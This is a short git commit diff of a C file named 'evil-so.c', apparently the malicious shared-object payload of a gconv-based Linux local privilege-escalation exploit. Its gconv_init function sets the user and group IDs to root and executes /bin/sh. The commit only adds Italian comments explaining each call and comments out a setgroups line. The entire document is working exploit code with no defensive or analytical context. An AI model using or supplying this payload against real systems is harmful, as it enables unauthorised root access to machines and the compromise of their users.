1f9b77a89e2d535d9385158c1d2f1435aa207708
piscquick00 <piscquick@protonmail.ch>
2026-04-12 13:21:07 +0200

    evil-so.c

--- evil-so.c
+++ evil-so.c
@@ -1,13 +1,14 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <unistd.h>
+#include <unistd.h>    // Per setuid(), setgid(), setgroups(), execve()
+#include <sys/types.h> // Per setuid(), setgid(), setgroups()
 
 void gconv() {}
 
 void gconv_init() {
-    setuid(0);
-    setgid(0);
-    setgroups(0);
+    setuid(0);     // Imposta l'UID del processo a 0 (root)
+    setgid(0);     // Imposta il GID del processo a 0 (root)
+/// setgroups(0);  // Imposta i gruppi del processo (se necessario)
 
-    execve("/bin/sh", NULL, NULL);
+    execve("/bin/sh", NULL, NULL); // Esegue la shell
 }
